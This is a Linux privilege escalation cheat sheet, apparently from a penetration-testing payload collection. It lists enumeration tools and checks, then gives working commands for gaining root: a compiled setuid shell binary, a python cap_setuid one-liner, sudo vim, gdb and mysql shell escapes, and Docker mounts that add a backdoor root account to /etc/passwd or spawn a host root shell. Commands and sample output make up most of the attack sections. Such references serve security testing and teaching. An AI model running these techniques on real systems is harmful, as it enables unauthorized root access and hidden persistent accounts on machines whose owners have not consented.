# Linux - Privilege Escalation

## Tools

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```
- [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
- [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

## Summary

* [Checklist](#checklist)
* [SUID](#suid)
* [Capabilities](#capabilities)
* [SUDO](#sudo)
* [Groups](#groups)
    * [Docker](#docker)

## Checklists

* Kernel and distribution release details
* System Information:
  * Hostname
  * Networking details:
  * Current IP
  * Default route details
  * DNS server information
* User Information:
  * Current user details
  * Last logged on users
  * Shows users logged onto the host
  * List all users including uid/gid information
  * List root accounts
  * Extracts password policies and hash storage method information
  * Checks umask value
  * Checks if password hashes are stored in /etc/passwd
  * Extract full details for ‘default’ uid’s such as 0, 1000, 1001 etc
  * Attempt to read restricted files i.e. /etc/shadow
  * List current users history files (i.e .bash_history, .nano_history etc.)
  * Basic SSH checks
* Privileged access:
  * Which users have recently used sudo
  * Determine if /etc/sudoers is accessible
  * Determine if the current user has Sudo access without a password
  * Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)
  * Is root’s home directory accessible
  * List permissions for /home/
* Environmental:
  * Display current $PATH
  * Displays env information
* Jobs/Tasks:
  * List all cron jobs
  * Locate all world-writable cron jobs
  * Locate cron jobs owned by other users of the system
  * List the active and inactive systemd timers
* Services:
  * List network connections (TCP & UDP)
  * List running processes
  * Lookup and list process binaries and associated permissions
  * List inetd.conf/xined.conf contents and associated binary file permissions
  * List init.d binary permissions
* Version Information (of the following):
  * Sudo
  * MYSQL
  * Postgres
  * Apache
    * Checks user config
    * Shows enabled modules
    * Checks for htpasswd files
    * View www directories
* Default/Weak Credentials:
  * Checks for default/weak Postgres accounts
  * Checks for default/weak MYSQL accounts
* Searches:
  * Locate all SUID/GUID files
  * Locate all world-writable SUID/GUID files
  * Locate all SUID/GUID files owned by root
  * Locate ‘interesting’ SUID/GUID files (i.e. nmap, vim etc)
  * Locate files with POSIX capabilities
  * List all world-writable files
  * Find/list all accessible *.plan files and display contents
  * Find/list all accessible *.rhosts files and display contents
  * Show NFS server details
  * Locate *.conf and *.log files containing keyword supplied at script runtime
  * List all *.conf files located in /etc
  * Locate mail
* Platform/software specific tests:
  * Checks to determine if we're in a Docker container
  * Checks to see if the host has Docker installed
  * Checks to determine if we're in an LXC container



## SUID

SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.

```powershell
╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```

### Find SUID binaries

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

### Create a SUID binary

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```


## Capabilities

List capabilities of binaries 
```bash
╭─swissky@crashmanjaro ~  
╰─$ getcap -r  /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

Edit capabilities
```powershell
/sbin/setcap -r /bin/ping      # remove
setcap cap_net_raw+p /bin/ping # add
```

Interesting capabilities

```powershell
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

Example of privilege escalation with `cap_setuid+ep`

```powershell
$ sudo setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

## SUDO

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```bash
$ sudo -l

User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user `demo` can run `vim` as `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling `sh`.

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

### GTFOBins

[GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit    
> sudo mysql -e '\! /bin/sh'    
> strace -o /dev/null /bin/sh


## Groups

### Docker

Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete 
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest

You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```



## References

- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
- [Privilege escalation via Docker - April 22, 2015 — Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)